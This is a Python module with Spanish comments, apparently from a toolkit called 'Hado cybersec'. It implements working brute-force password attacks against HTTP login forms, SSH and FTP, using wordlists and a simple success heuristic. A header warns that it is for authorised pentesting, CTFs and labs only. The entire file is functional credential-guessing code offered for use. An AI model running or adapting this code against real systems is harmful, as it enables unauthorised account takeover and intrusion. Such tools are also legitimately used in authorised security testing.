"""
Hado cybersec — Modulo de ataques de fuerza bruta.
ADVERTENCIA: Solo para uso en entornos autorizados (pentesting, CTFs, labs propios).
"""

from typing import List, Optional
import warnings


def attack(service: str, target: str, wordlist, username: str = "admin") -> dict:
    """
    Ataque de fuerza bruta contra un servicio.

    Args:
        service: tipo de servicio ("http", "ssh", "ftp", "http-get", "http-post")
        target: host/URL objetivo
        wordlist: lista de passwords O path a archivo de wordlist
        username: usuario a atacar (default: "admin")

    Returns:
        dict con claves:
          - success: bool
          - credential: {"user": str, "password": str} | None
          - attempts: int
    """
    passwords = _load_wordlist(wordlist)

    if service in ("http", "http-post", "http-get"):
        return _brute_http(target, username, passwords, method=service)
    elif service == "ssh":
        return _brute_ssh(target, username, passwords)
    elif service == "ftp":
        return _brute_ftp(target, username, passwords)
    else:
        warnings.warn(
            f"Servicio '{service}' no soportado. Servicios disponibles: http, ssh, ftp",
            RuntimeWarning,
            stacklevel=2,
        )
        return {"success": False, "credential": None, "attempts": 0}


def _load_wordlist(wordlist) -> List[str]:
    if isinstance(wordlist, list):
        return wordlist
    if isinstance(wordlist, str):
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return []
    return list(wordlist)


def _brute_http(url: str, username: str, passwords: List[str], method: str = "http") -> dict:
    try:
        import requests
    except ImportError:
        return {"success": False, "credential": None, "attempts": 0, "error": "requests no instalado"}

    for i, password in enumerate(passwords):
        try:
            resp = requests.post(
                url,
                data={"username": username, "password": password},
                timeout=5,
                allow_redirects=False,
            )
            # Heuristica basica: 302 redirect o 200 con token sugiere exito
            if resp.status_code in (200, 302) and "invalid" not in resp.text.lower():
                return {
                    "success": True,
                    "credential": {"user": username, "password": password},
                    "attempts": i + 1,
                }
        except requests.RequestException:
            continue

    return {"success": False, "credential": None, "attempts": len(passwords)}


def _brute_ssh(host: str, username: str, passwords: List[str]) -> dict:
    try:
        import paramiko  # type: ignore
    except ImportError:
        return {
            "success": False,
            "credential": None,
            "attempts": 0,
            "error": "paramiko no instalado. Ejecuta: pip install paramiko",
        }

    for i, password in enumerate(passwords):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=username, password=password, timeout=5)
            client.close()
            return {
                "success": True,
                "credential": {"user": username, "password": password},
                "attempts": i + 1,
            }
        except paramiko.AuthenticationException:
            continue
        except Exception:
            break
        finally:
            client.close()

    return {"success": False, "credential": None, "attempts": len(passwords)}


def _brute_ftp(host: str, username: str, passwords: List[str]) -> dict:
    import ftplib

    for i, password in enumerate(passwords):
        try:
            ftp = ftplib.FTP(timeout=5)
            ftp.connect(host)
            ftp.login(username, password)
            ftp.quit()
            return {
                "success": True,
                "credential": {"user": username, "password": password},
                "attempts": i + 1,
            }
        except ftplib.error_perm:
            continue
        except Exception:
            break

    return {"success": False, "credential": None, "attempts": len(passwords)}
